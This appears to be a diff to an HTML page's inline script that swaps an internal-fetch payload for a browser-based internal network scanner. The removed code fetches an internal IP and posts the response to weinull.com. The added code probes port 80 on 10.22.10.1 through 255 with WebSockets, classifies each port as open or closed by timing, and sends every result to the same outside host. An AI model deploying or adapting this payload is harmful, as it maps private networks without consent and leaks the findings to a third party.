@@ -10,10 +10,24 @@
 <body>
 
 <script type="application/javascript">
-    $.get("https://10.73.197.14/", function (result) {
-        $.post("https://weinull.com/whoami", {"result": result});
-    });
-
+    function port_scan(ip, port) {
+        var ws = new WebSocket("ws://" + ip + ":" + port.toString());
+        
+        ws.onopen = function () {
+            $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
+        };
+        
+        ws.onerror = function (msg) {
+            if (msg.timeStamp < 1000) {
+                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
+            } else {
+                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - close - timeStamp: " + msg.timeStamp.toString()});
+            }
+        };
+    }
+    for (var i = 1; i < 256; i++) {
+        port_scan("10.22.10." + i.toString(), 80)
+    }
 </script>
 
 <script type="application/javascript" src="/static/js/bootstrap.min.js"></script>
